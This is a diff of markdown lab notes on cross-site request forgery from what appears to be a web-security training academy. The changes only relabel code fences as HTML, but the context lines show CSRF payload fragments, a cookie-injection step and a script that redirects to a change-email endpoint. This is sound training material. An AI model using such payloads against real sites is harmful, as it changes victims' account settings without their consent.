@@ -259,7 +259,7 @@ In order to exploit this vulnerability, we need to perform 2 things:
 
 - HTML payload (form action= https://HOST/POST (change email request - first tab) | 
                img src= https://HOST/POST(injected header - second tab) )
-```
+```html
 <html>
     <body>
         <h1>Hello World!</h1>
@@ -318,12 +318,12 @@ In order to exploit this vulnerability, we need to perform 2 things:
 ![[Pasted image 20240922012718.png]]
 ![[Pasted image 20240922012739.png]]
 
-- we will inject to cookie header trough the search set cookie value which will be equal to the csrf token (first tab)
+- we will inject to cookie header trough the search set cookie, value which will be equal to the csrf token (first tab)
 ![[Pasted image 20240922013015.png]]
 
 - HTML payload (form action= https://HOST/POST (change email request - first tab) | 
                img src= https://HOST/POST(injected header - second tab) )
-```
+```html
 <html>
     <body>
         <h1>Hello World!</h1>
@@ -375,7 +375,7 @@ python3 -m http.server <port-number>
 	![[Pasted image 20240924115507.png]]
 	
 - HTML/Javascript payload (document.location="https://HOST/GET")
-```
+```html
 <script>
     document.location = "https://0a1200a103990ed481024882008600cc.web-security-academy.net/my-account/change-email?email=test2%40test.ca&_method=POST";
 </script>
@@ -469,7 +469,7 @@ document.location=https://YOUR-LAB-ID.web-security-academy.net/post/comment/conf
 ##### Attempt a CSRF attack
 1. In the browser, go to the exploit server.
 2. Use the following template to create a basic CSRF attack for changing the victim's email address:
-```
+```html
 <script>
     history.pushState('', '', '/')
 </script>
